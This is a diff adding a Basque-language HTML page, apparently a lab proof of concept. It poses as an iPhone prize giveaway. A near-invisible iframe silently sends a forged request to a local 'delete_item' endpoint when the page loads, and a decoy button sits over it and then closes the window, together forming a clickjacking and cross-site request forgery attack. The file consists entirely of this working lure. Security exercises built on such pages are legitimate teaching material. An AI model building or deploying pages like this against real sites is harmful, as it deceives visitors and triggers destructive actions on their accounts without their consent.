@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Saria</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial;
+            background: black;
+            color: white;
+            margin: 0;
+            padding: 50px;
+        }
+        
+        iframe {
+            opacity: 0.001;
+            position: absolute;
+            top: 200px;
+            left: 300px;
+            width: 300px;
+            height: 100px;
+            border: none;
+        }
+        
+        button {
+            position: absolute;
+            top: 220px;
+            left: 350px;
+            width: 150px;
+            height: 40px;
+            background: red;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 1000;
+        }
+        
+        h1 {
+            margin-top: 100px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>🎉 iPhone Bat Irabazi Duzu! 🎉</h1>
+    <p>Sakatu botoia saria jasotzeko</p>
+    
+    <!-- Iframe ezkutuan: eskaera automatikoa -->
+    <iframe src="http://localhost:81/delete_item?item=XXXXXXXXX"></iframe>
+    
+    <!-- Erabiltzaileak sakatuko duen botoia -->
+    <button>Jaso Saria</button>
+
+    <script>
+        document.querySelector('button').addEventListener('click', function() {
+            alert('Zorionak! Orria ixten...');
+            setTimeout(function() {
+                window.close();
+            }, 1000);
+        });
+    </script>
+
+</body>
+</html>
